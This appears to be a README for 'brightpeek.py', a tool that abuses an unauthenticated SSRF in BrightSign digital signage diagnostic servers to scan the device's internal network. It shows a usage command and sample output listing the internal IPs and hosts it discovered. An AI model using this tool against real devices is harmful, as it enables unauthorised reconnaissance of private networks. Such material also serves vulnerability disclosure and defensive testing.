### Enumerate network hosts through BrightSign unauthenticated SSRF

[BrightSign Digital Signage Diagnostic Web Server 8.2.26 - Server-Side Request Forgery (Unauthenticated)](https://www.exploit-db.com/exploits/48843)

Usage:
```
brightpeek.py DEVICE_ADDRESS:DEVICE_PORT_NUMBER
```

Example output:
```
External:           xxx.xxx.xxx.xxx:12345
Internal IP:        192.168.73.93
Internal Network:   192.168.73.0/24
Scanning (this may take a while)...
Hit: 192.168.73.10:1337 <-> Speed test failed on URL '192.168.73.10:1337', Reason: 'Failed to connect to 192.168.73.10 port 1337: Connection refused'<br>

Ctrl-C pressed, exiting.
Hosts located in scan:
192.168.73.10
Done.
```
